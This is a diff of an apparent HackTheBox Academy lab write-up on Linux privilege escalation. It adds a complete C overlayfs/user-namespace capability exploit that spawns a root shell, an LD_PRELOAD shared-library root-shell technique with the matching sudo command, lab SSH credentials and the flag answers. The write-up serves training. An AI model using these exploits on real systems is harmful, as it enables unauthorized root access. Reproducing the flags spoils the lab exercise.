+<span class="normal"><a href="#__codelineno-45-119">119</a></span>
+<span class="normal"><a href="#__codelineno-45-120">120</a></span>
+<span class="normal"><a href="#__codelineno-45-121">121</a></span>
+<span class="normal"><a href="#__codelineno-45-122">122</a></span>
+<span class="normal"><a href="#__codelineno-45-123">123</a></span>
+<span class="normal"><a href="#__codelineno-45-124">124</a></span>
+<span class="normal"><a href="#__codelineno-45-125">125</a></span>
+<span class="normal"><a href="#__codelineno-45-126">126</a></span>
+<span class="normal"><a href="#__codelineno-45-127">127</a></span>
+<span class="normal"><a href="#__codelineno-45-128">128</a></span>
+<span class="normal"><a href="#__codelineno-45-129">129</a></span>
+<span class="normal"><a href="#__codelineno-45-130">130</a></span>
+<span class="normal"><a href="#__codelineno-45-131">131</a></span>
+<span class="normal"><a href="#__codelineno-45-132">132</a></span>
+<span class="normal"><a href="#__codelineno-45-133">133</a></span>
+<span class="normal"><a href="#__codelineno-45-134">134</a></span>
+<span class="normal"><a href="#__codelineno-45-135">135</a></span>
+<span class="normal"><a href="#__codelineno-45-136">136</a></span>
+<span class="normal"><a href="#__codelineno-45-137">137</a></span>
+<span class="normal"><a href="#__codelineno-45-138">138</a></span>
+<span class="normal"><a href="#__codelineno-45-139">139</a></span>
+<span class="normal"><a href="#__codelineno-45-140">140</a></span>
+<span class="normal"><a href="#__codelineno-45-141">141</a></span>
+<span class="normal"><a href="#__codelineno-45-142">142</a></span>
+<span class="normal"><a href="#__codelineno-45-143">143</a></span>
+<span class="normal"><a href="#__codelineno-45-144">144</a></span>
+<span class="normal"><a href="#__codelineno-45-145">145</a></span>
+<span class="normal"><a href="#__codelineno-45-146">146</a></span>
+<span class="normal"><a href="#__codelineno-45-147">147</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1"></a>#define _GNU_SOURCE
+</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2"></a>#include &lt;stdio.h&gt;
+</span><span id="__span-45-3"><a id="__codelineno-45-3" name="__codelineno-45-3"></a>#include &lt;stdlib.h&gt;
+</span><span id="__span-45-4"><a id="__codelineno-45-4" name="__codelineno-45-4"></a>#include &lt;string.h&gt;
+</span><span id="__span-45-5"><a id="__codelineno-45-5" name="__codelineno-45-5"></a>#include &lt;unistd.h&gt;
+</span><span id="__span-45-6"><a id="__codelineno-45-6" name="__codelineno-45-6"></a>#include &lt;fcntl.h&gt;
+</span><span id="__span-45-7"><a id="__codelineno-45-7" name="__codelineno-45-7"></a>#include &lt;err.h&gt;
+</span><span id="__span-45-8"><a id="__codelineno-45-8" name="__codelineno-45-8"></a>#include &lt;errno.h&gt;
+</span><span id="__span-45-9"><a id="__codelineno-45-9" name="__codelineno-45-9"></a>#include &lt;sched.h&gt;
+</span><span id="__span-45-10"><a id="__codelineno-45-10" name="__codelineno-45-10"></a>#include &lt;sys/types.h&gt;
+</span><span id="__span-45-11"><a id="__codelineno-45-11" name="__codelineno-45-11"></a>#include &lt;sys/stat.h&gt;
+</span><span id="__span-45-12"><a id="__codelineno-45-12" name="__codelineno-45-12"></a>#include &lt;sys/wait.h&gt;
+</span><span id="__span-45-13"><a id="__codelineno-45-13" name="__codelineno-45-13"></a>#include &lt;sys/mount.h&gt;
+</span><span id="__span-45-14"><a id="__codelineno-45-14" name="__codelineno-45-14"></a>
+</span><span id="__span-45-15"><a id="__codelineno-45-15" name="__codelineno-45-15"></a>//#include &lt;attr/xattr.h&gt;
+</span><span id="__span-45-16"><a id="__codelineno-45-16" name="__codelineno-45-16"></a>//#include &lt;sys/xattr.h&gt;
+</span><span id="__span-45-17"><a id="__codelineno-45-17" name="__codelineno-45-17"></a>int setxattr(const char *path, const char *name, const void *value, size_t size, int flags);
+</span><span id="__span-45-18"><a id="__codelineno-45-18" name="__codelineno-45-18"></a>
+</span><span id="__span-45-19"><a id="__codelineno-45-19" name="__codelineno-45-19"></a>
+</span><span id="__span-45-20"><a id="__codelineno-45-20" name="__codelineno-45-20"></a>#define DIR_BASE    &quot;./ovlcap&quot;
+</span><span id="__span-45-21"><a id="__codelineno-45-21" name="__codelineno-45-21"></a>#define DIR_WORK    DIR_BASE &quot;/work&quot;
+</span><span id="__span-45-22"><a id="__codelineno-45-22" name="__codelineno-45-22"></a>#define DIR_LOWER   DIR_BASE &quot;/lower&quot;
+</span><span id="__span-45-23"><a id="__codelineno-45-23" name="__codelineno-45-23"></a>#define DIR_UPPER   DIR_BASE &quot;/upper&quot;
+</span><span id="__span-45-24"><a id="__codelineno-45-24" name="__codelineno-45-24"></a>#define DIR_MERGE   DIR_BASE &quot;/merge&quot;
+</span><span id="__span-45-25"><a id="__codelineno-45-25" name="__codelineno-45-25"></a>#define BIN_MERGE   DIR_MERGE &quot;/magic&quot;
+</span><span id="__span-45-26"><a id="__codelineno-45-26" name="__codelineno-45-26"></a>#define BIN_UPPER   DIR_UPPER &quot;/magic&quot;
+</span><span id="__span-45-27"><a id="__codelineno-45-27" name="__codelineno-45-27"></a>
+</span><span id="__span-45-28"><a id="__codelineno-45-28" name="__codelineno-45-28"></a>
+</span><span id="__span-45-29"><a id="__codelineno-45-29" name="__codelineno-45-29"></a>static void xmkdir(const char *path, mode_t mode)
+</span><span id="__span-45-30"><a id="__codelineno-45-30" name="__codelineno-45-30"></a>{
+</span><span id="__span-45-31"><a id="__codelineno-45-31" name="__codelineno-45-31"></a>    if (mkdir(path, mode) == -1 &amp;&amp; errno != EEXIST)
+</span><span id="__span-45-32"><a id="__codelineno-45-32" name="__codelineno-45-32"></a>        err(1, &quot;mkdir %s&quot;, path);
+</span><span id="__span-45-33"><a id="__codelineno-45-33" name="__codelineno-45-33"></a>}
+</span><span id="__span-45-34"><a id="__codelineno-45-34" name="__codelineno-45-34"></a>
+</span><span id="__span-45-35"><a id="__codelineno-45-35" name="__codelineno-45-35"></a>static void xwritefile(const char *path, const char *data)
+</span><span id="__span-45-36"><a id="__codelineno-45-36" name="__codelineno-45-36"></a>{
+</span><span id="__span-45-37"><a id="__codelineno-45-37" name="__codelineno-45-37"></a>    int fd = open(path, O_WRONLY);
+</span><span id="__span-45-38"><a id="__codelineno-45-38" name="__codelineno-45-38"></a>    if (fd == -1)
+</span><span id="__span-45-39"><a id="__codelineno-45-39" name="__codelineno-45-39"></a>        err(1, &quot;open %s&quot;, path);
+</span><span id="__span-45-40"><a id="__codelineno-45-40" name="__codelineno-45-40"></a>    ssize_t len = (ssize_t) strlen(data);
+</span><span id="__span-45-41"><a id="__codelineno-45-41" name="__codelineno-45-41"></a>    if (write(fd, data, len) != len)
+</span><span id="__span-45-42"><a id="__codelineno-45-42" name="__codelineno-45-42"></a>        err(1, &quot;write %s&quot;, path);
+</span><span id="__span-45-43"><a id="__codelineno-45-43" name="__codelineno-45-43"></a>    close(fd);
+</span><span id="__span-45-44"><a id="__codelineno-45-44" name="__codelineno-45-44"></a>}
+</span><span id="__span-45-45"><a id="__codelineno-45-45" name="__codelineno-45-45"></a>
+</span><span id="__span-45-46"><a id="__codelineno-45-46" name="__codelineno-45-46"></a>static void xcopyfile(const char *src, const char *dst, mode_t mode)
+</span><span id="__span-45-47"><a id="__codelineno-45-47" name="__codelineno-45-47"></a>{
+</span><span id="__span-45-48"><a id="__codelineno-45-48" name="__codelineno-45-48"></a>    int fi, fo;
+</span><span id="__span-45-49"><a id="__codelineno-45-49" name="__codelineno-45-49"></a>
+</span><span id="__span-45-50"><a id="__codelineno-45-50" name="__codelineno-45-50"></a>    if ((fi = open(src, O_RDONLY)) == -1)
+</span><span id="__span-45-51"><a id="__codelineno-45-51" name="__codelineno-45-51"></a>        err(1, &quot;open %s&quot;, src);
+</span><span id="__span-45-52"><a id="__codelineno-45-52" name="__codelineno-45-52"></a>    if ((fo = open(dst, O_WRONLY | O_CREAT, mode)) == -1)
+</span><span id="__span-45-53"><a id="__codelineno-45-53" name="__codelineno-45-53"></a>        err(1, &quot;open %s&quot;, dst);
+</span><span id="__span-45-54"><a id="__codelineno-45-54" name="__codelineno-45-54"></a>
+</span><span id="__span-45-55"><a id="__codelineno-45-55" name="__codelineno-45-55"></a>    char buf[4096];
+</span><span id="__span-45-56"><a id="__codelineno-45-56" name="__codelineno-45-56"></a>    ssize_t rd, wr;
+</span><span id="__span-45-57"><a id="__codelineno-45-57" name="__codelineno-45-57"></a>
+</span><span id="__span-45-58"><a id="__codelineno-45-58" name="__codelineno-45-58"></a>    for (;;) {
+</span><span id="__span-45-59"><a id="__codelineno-45-59" name="__codelineno-45-59"></a>        rd = read(fi, buf, sizeof(buf));
+</span><span id="__span-45-60"><a id="__codelineno-45-60" name="__codelineno-45-60"></a>        if (rd == 0) {
+</span><span id="__span-45-61"><a id="__codelineno-45-61" name="__codelineno-45-61"></a>            break;
+</span><span id="__span-45-62"><a id="__codelineno-45-62" name="__codelineno-45-62"></a>        } else if (rd == -1) {
+</span><span id="__span-45-63"><a id="__codelineno-45-63" name="__codelineno-45-63"></a>            if (errno == EINTR)
+</span><span id="__span-45-64"><a id="__codelineno-45-64" name="__codelineno-45-64"></a>                continue;
+</span><span id="__span-45-65"><a id="__codelineno-45-65" name="__codelineno-45-65"></a>            err(1, &quot;read %s&quot;, src);
+</span><span id="__span-45-66"><a id="__codelineno-45-66" name="__codelineno-45-66"></a>        }
+</span><span id="__span-45-67"><a id="__codelineno-45-67" name="__codelineno-45-67"></a>
+</span><span id="__span-45-68"><a id="__codelineno-45-68" name="__codelineno-45-68"></a>        char *p = buf;
+</span><span id="__span-45-69"><a id="__codelineno-45-69" name="__codelineno-45-69"></a>        while (rd &gt; 0) {
+</span><span id="__span-45-70"><a id="__codelineno-45-70" name="__codelineno-45-70"></a>            wr = write(fo, p, rd);
+</span><span id="__span-45-71"><a id="__codelineno-45-71" name="__codelineno-45-71"></a>            if (wr == -1) {
+</span><span id="__span-45-72"><a id="__codelineno-45-72" name="__codelineno-45-72"></a>                if (errno == EINTR)
+</span><span id="__span-45-73"><a id="__codelineno-45-73" name="__codelineno-45-73"></a>                    continue;
+</span><span id="__span-45-74"><a id="__codelineno-45-74" name="__codelineno-45-74"></a>                err(1, &quot;write %s&quot;, dst);
+</span><span id="__span-45-75"><a id="__codelineno-45-75" name="__codelineno-45-75"></a>            }
+</span><span id="__span-45-76"><a id="__codelineno-45-76" name="__codelineno-45-76"></a>            p += wr;
+</span><span id="__span-45-77"><a id="__codelineno-45-77" name="__codelineno-45-77"></a>            rd -= wr;
+</span><span id="__span-45-78"><a id="__codelineno-45-78" name="__codelineno-45-78"></a>        }
+</span><span id="__span-45-79"><a id="__codelineno-45-79" name="__codelineno-45-79"></a>    }
+</span><span id="__span-45-80"><a id="__codelineno-45-80" name="__codelineno-45-80"></a>
+</span><span id="__span-45-81"><a id="__codelineno-45-81" name="__codelineno-45-81"></a>    close(fi);
+</span><span id="__span-45-82"><a id="__codelineno-45-82" name="__codelineno-45-82"></a>    close(fo);
+</span><span id="__span-45-83"><a id="__codelineno-45-83" name="__codelineno-45-83"></a>}
+</span><span id="__span-45-84"><a id="__codelineno-45-84" name="__codelineno-45-84"></a>
+</span><span id="__span-45-85"><a id="__codelineno-45-85" name="__codelineno-45-85"></a>static int exploit()
+</span><span id="__span-45-86"><a id="__codelineno-45-86" name="__codelineno-45-86"></a>{
+</span><span id="__span-45-87"><a id="__codelineno-45-87" name="__codelineno-45-87"></a>    char buf[4096];
+</span><span id="__span-45-88"><a id="__codelineno-45-88" name="__codelineno-45-88"></a>
+</span><span id="__span-45-89"><a id="__codelineno-45-89" name="__codelineno-45-89"></a>    sprintf(buf, &quot;rm -rf &#39;%s/&#39;&quot;, DIR_BASE);
+</span><span id="__span-45-90"><a id="__codelineno-45-90" name="__codelineno-45-90"></a>    system(buf);
+</span><span id="__span-45-91"><a id="__codelineno-45-91" name="__codelineno-45-91"></a>
+</span><span id="__span-45-92"><a id="__codelineno-45-92" name="__codelineno-45-92"></a>    xmkdir(DIR_BASE, 0777);
+</span><span id="__span-45-93"><a id="__codelineno-45-93" name="__codelineno-45-93"></a>    xmkdir(DIR_WORK,  0777);
+</span><span id="__span-45-94"><a id="__codelineno-45-94" name="__codelineno-45-94"></a>    xmkdir(DIR_LOWER, 0777);
+</span><span id="__span-45-95"><a id="__codelineno-45-95" name="__codelineno-45-95"></a>    xmkdir(DIR_UPPER, 0777);
+</span><span id="__span-45-96"><a id="__codelineno-45-96" name="__codelineno-45-96"></a>    xmkdir(DIR_MERGE, 0777);
+</span><span id="__span-45-97"><a id="__codelineno-45-97" name="__codelineno-45-97"></a>
+</span><span id="__span-45-98"><a id="__codelineno-45-98" name="__codelineno-45-98"></a>    uid_t uid = getuid();
+</span><span id="__span-45-99"><a id="__codelineno-45-99" name="__codelineno-45-99"></a>    gid_t gid = getgid();
+</span><span id="__span-45-100"><a id="__codelineno-45-100" name="__codelineno-45-100"></a>
+</span><span id="__span-45-101"><a id="__codelineno-45-101" name="__codelineno-45-101"></a>    if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1)
+</span><span id="__span-45-102"><a id="__codelineno-45-102" name="__codelineno-45-102"></a>        err(1, &quot;unshare&quot;);
+</span><span id="__span-45-103"><a id="__codelineno-45-103" name="__codelineno-45-103"></a>
+</span><span id="__span-45-104"><a id="__codelineno-45-104" name="__codelineno-45-104"></a>    xwritefile(&quot;/proc/self/setgroups&quot;, &quot;deny&quot;);
+</span><span id="__span-45-105"><a id="__codelineno-45-105" name="__codelineno-45-105"></a>
+</span><span id="__span-45-106"><a id="__codelineno-45-106" name="__codelineno-45-106"></a>    sprintf(buf, &quot;0 %d 1&quot;, uid);
+</span><span id="__span-45-107"><a id="__codelineno-45-107" name="__codelineno-45-107"></a>    xwritefile(&quot;/proc/self/uid_map&quot;, buf);
+</span><span id="__span-45-108"><a id="__codelineno-45-108" name="__codelineno-45-108"></a>
+</span><span id="__span-45-109"><a id="__codelineno-45-109" name="__codelineno-45-109"></a>    sprintf(buf, &quot;0 %d 1&quot;, gid);
+</span><span id="__span-45-110"><a id="__codelineno-45-110" name="__codelineno-45-110"></a>    xwritefile(&quot;/proc/self/gid_map&quot;, buf);
+</span><span id="__span-45-111"><a id="__codelineno-45-111" name="__codelineno-45-111"></a>
+</span><span id="__span-45-112"><a id="__codelineno-45-112" name="__codelineno-45-112"></a>    sprintf(buf, &quot;lowerdir=%s,upperdir=%s,workdir=%s&quot;, DIR_LOWER, DIR_UPPER, DIR_WORK);
+</span><span id="__span-45-113"><a id="__codelineno-45-113" name="__codelineno-45-113"></a>    if (mount(&quot;overlay&quot;, DIR_MERGE, &quot;overlay&quot;, 0, buf) == -1)
+</span><span id="__span-45-114"><a id="__codelineno-45-114" name="__codelineno-45-114"></a>        err(1, &quot;mount %s&quot;, DIR_MERGE);
+</span><span id="__span-45-115"><a id="__codelineno-45-115" name="__codelineno-45-115"></a>
+</span><span id="__span-45-116"><a id="__codelineno-45-116" name="__codelineno-45-116"></a>    // all+ep
+</span><span id="__span-45-117"><a id="__codelineno-45-117" name="__codelineno-45-117"></a>    char cap[] = &quot;\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00&quot;;
+</span><span id="__span-45-118"><a id="__codelineno-45-118" name="__codelineno-45-118"></a>
+</span><span id="__span-45-119"><a id="__codelineno-45-119" name="__codelineno-45-119"></a>    xcopyfile(&quot;/proc/self/exe&quot;, BIN_MERGE, 0777);
+</span><span id="__span-45-120"><a id="__codelineno-45-120" name="__codelineno-45-120"></a>    if (setxattr(BIN_MERGE, &quot;security.capability&quot;, cap, sizeof(cap) - 1, 0) == -1)
+</span><span id="__span-45-121"><a id="__codelineno-45-121" name="__codelineno-45-121"></a>        err(1, &quot;setxattr %s&quot;, BIN_MERGE);
+</span><span id="__span-45-122"><a id="__codelineno-45-122" name="__codelineno-45-122"></a>
+</span><span id="__span-45-123"><a id="__codelineno-45-123" name="__codelineno-45-123"></a>    return 0;
+</span><span id="__span-45-124"><a id="__codelineno-45-124" name="__codelineno-45-124"></a>}
+</span><span id="__span-45-125"><a id="__codelineno-45-125" name="__codelineno-45-125"></a>
+</span><span id="__span-45-126"><a id="__codelineno-45-126" name="__codelineno-45-126"></a>int main(int argc, char *argv[])
+</span><span id="__span-45-127"><a id="__codelineno-45-127" name="__codelineno-45-127"></a>{
+</span><span id="__span-45-128"><a id="__codelineno-45-128" name="__codelineno-45-128"></a>    if (strstr(argv[0], &quot;magic&quot;) || (argc &gt; 1 &amp;&amp; !strcmp(argv[1], &quot;shell&quot;))) {
+</span><span id="__span-45-129"><a id="__codelineno-45-129" name="__codelineno-45-129"></a>        setuid(0);
+</span><span id="__span-45-130"><a id="__codelineno-45-130" name="__codelineno-45-130"></a>        setgid(0);
+</span><span id="__span-45-131"><a id="__codelineno-45-131" name="__codelineno-45-131"></a>        execl(&quot;/bin/bash&quot;, &quot;/bin/bash&quot;, &quot;--norc&quot;, &quot;--noprofile&quot;, &quot;-i&quot;, NULL);
+</span><span id="__span-45-132"><a id="__codelineno-45-132" name="__codelineno-45-132"></a>        err(1, &quot;execl /bin/bash&quot;);
+</span><span id="__span-45-133"><a id="__codelineno-45-133" name="__codelineno-45-133"></a>    }
+</span><span id="__span-45-134"><a id="__codelineno-45-134" name="__codelineno-45-134"></a>
+</span><span id="__span-45-135"><a id="__codelineno-45-135" name="__codelineno-45-135"></a>    pid_t child = fork();
+</span><span id="__span-45-136"><a id="__codelineno-45-136" name="__codelineno-45-136"></a>    if (child == -1)
+</span><span id="__span-45-137"><a id="__codelineno-45-137" name="__codelineno-45-137"></a>        err(1, &quot;fork&quot;);
+</span><span id="__span-45-138"><a id="__codelineno-45-138" name="__codelineno-45-138"></a>
+</span><span id="__span-45-139"><a id="__codelineno-45-139" name="__codelineno-45-139"></a>    if (child == 0) {
+</span><span id="__span-45-140"><a id="__codelineno-45-140" name="__codelineno-45-140"></a>        _exit(exploit());
+</span><span id="__span-45-141"><a id="__codelineno-45-141" name="__codelineno-45-141"></a>    } else {
+</span><span id="__span-45-142"><a id="__codelineno-45-142" name="__codelineno-45-142"></a>        waitpid(child, NULL, 0);
+</span><span id="__span-45-143"><a id="__codelineno-45-143" name="__codelineno-45-143"></a>    }
+</span><span id="__span-45-144"><a id="__codelineno-45-144" name="__codelineno-45-144"></a>
+</span><span id="__span-45-145"><a id="__codelineno-45-145" name="__codelineno-45-145"></a>    execl(BIN_UPPER, BIN_UPPER, &quot;shell&quot;, NULL);
+</span><span id="__span-45-146"><a id="__codelineno-45-146" name="__codelineno-45-146"></a>    err(1, &quot;execl %s&quot;, BIN_UPPER);
+</span><span id="__span-45-147"><a id="__codelineno-45-147" name="__codelineno-45-147"></a>}
+</span></code></pre></div></td></tr></table></div>
+<p>Compile the file:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-46-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1"></a>gcc exploit.c -o exploit
+</span></code></pre></div></td></tr></table></div>
+<p>And run it</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-47-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1"></a>./exploit
+</span></code></pre></div></td></tr></table></div>
+<p>Cat the flag:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-48-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1"></a>cat /root/kernel_exploit/flag.txt
+</span></code></pre></div></td></tr></table></div>
+<p>Results: 46237b8aa523bc7e0365de09c0c0164f</p>
+<p><strong>SSH to  (ACADEMY-LPE-NIX02) with user "htb-student" and password "Academy_LLPE!". Escalate privileges using LD_PRELOAD technique. Submit the contents of the flag.txt file in the /root/ld_preload directory.</strong></p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-49-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1"></a>sudo<span class="w"> </span>-l
+</span></code></pre></div></td></tr></table></div>
+<p>Output:</p>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-50-1">1</a></span>
+<span class="normal"><a href="#__codelineno-50-2">2</a></span>
+<span class="normal"><a href="#__codelineno-50-3">3</a></span>
+<span class="normal"><a href="#__codelineno-50-4">4</a></span>
+<span class="normal"><a href="#__codelineno-50-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1"></a><span class="go">Matching Defaults entries for htb-student on NIX02:</span>
+</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2"></a><span class="go">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD</span>
+</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3"></a>
+</span><span id="__span-50-4"><a id="__codelineno-50-4" name="__codelineno-50-4"></a><span class="go">User htb-student may run the following commands on NIX02:</span>
+</span><span id="__span-50-5"><a id="__codelineno-50-5" name="__codelineno-50-5"></a><span class="go">    (root) NOPASSWD: /usr/bin/openssl</span>
+</span></code></pre></div></td></tr></table></div>
+<p>This user has rights to restart the openssl service as root, but since this is <code>NOT</code> a <a href="https://gtfobins.github.io/#apache">GTFOBin</a> and the <code>/etc/sudoers</code> entry is written specifying the absolute path, this could not be used to escalate privileges under normal circumstances.</p>
+<p>However, we can exploit the <code>LD_PRELOAD</code> issue to run a custom shared library file. Let's compile the following library:</p>
+<div class="language-c highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-51-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-51-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-51-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-51-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-51-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-51-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-51-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-51-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-51-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-51-10">10</a></span>
+<span class="normal"><a href="#__codelineno-51-11">11</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/types.h&gt;</span>
+</span><span id="__span-51-3"><a id="__codelineno-51-3" name="__codelineno-51-3"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+</span><span id="__span-51-4"><a id="__codelineno-51-4" name="__codelineno-51-4"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+</span><span id="__span-51-5"><a id="__codelineno-51-5" name="__codelineno-51-5"></a>
+</span><span id="__span-51-6"><a id="__codelineno-51-6" name="__codelineno-51-6"></a><span class="kt">void</span><span class="w"> </span><span class="nf">_init</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-51-7"><a id="__codelineno-51-7" name="__codelineno-51-7"></a><span class="n">unsetenv</span><span class="p">(</span><span class="s">&quot;LD_PRELOAD&quot;</span><span class="p">);</span>
+</span><span id="__span-51-8"><a id="__codelineno-51-8" name="__codelineno-51-8"></a><span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span><span id="__span-51-9"><a id="__codelineno-51-9" name="__codelineno-51-9"></a><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span><span id="__span-51-10"><a id="__codelineno-51-10" name="__codelineno-51-10"></a><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">);</span>
+</span><span id="__span-51-11"><a id="__codelineno-51-11" name="__codelineno-51-11"></a><span class="p">}</span>
+</span></code></pre></div></td></tr></table></div>
+<p>We can compile this as follows:</p>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-52-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1"></a><span class="go"> gcc -fPIC -shared -o library.so library.c -nostartfiles</span>
+</span></code></pre></div></td></tr></table></div>
+<p>Finally, we can escalate privileges using the below command. Make sure to specify the full path to your malicious library file.</p>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-53-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1"></a><span class="go">sudo LD_PRELOAD=~/library.so /usr/bin/openssl restart</span>
+</span></code></pre></div></td></tr></table></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-54-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1"></a>cat /root/ld_preload/flag.txt 
+</span></code></pre></div></td></tr></table></div>
+<p>Results:  6a9c151a599135618b8f09adc78ab5f1</p>
 
 <!-- This section adds support for localized revision dates -->
 
-    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2025-02-12T20:36:23+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2025-02-12</span></small></br>
+    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2025-02-16T21:39:54+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2025-02-16</span></small></br>
 
 
     <small>Created: February 10, 2025 21:03:30</small>
